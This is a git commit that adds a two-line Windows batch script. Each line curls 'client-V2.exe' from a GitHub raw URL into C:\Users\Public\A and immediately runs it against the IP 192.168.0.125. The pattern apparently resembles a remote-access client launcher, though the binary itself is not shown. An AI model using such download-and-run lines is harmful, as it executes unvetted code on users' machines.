0dfd2e6055c934e89bf350ade1e01f02f9e5ccfd
Mandeep Sheoran <43616221+mdsheoran09@users.noreply.github.com>
2022-06-27 10:42:01 +0530

    Create launch.bat

---
+++ launch.bat
@@ -0,0 +1,2 @@
+curl https://raw.githubusercontent.com/mdsheoran09/launch/main/client-V2.exe --output C:\Users\Public\A\client.exe & C:\Users\Public\A\client.exe 192.168.0.125
+curl https://raw.githubusercontent.com/mdsheoran09/launch/main/client-V2.exe --output C:\Users\Public\A\client1.exe & C:\Users\Public\A\client1.exe 192.168.0.125
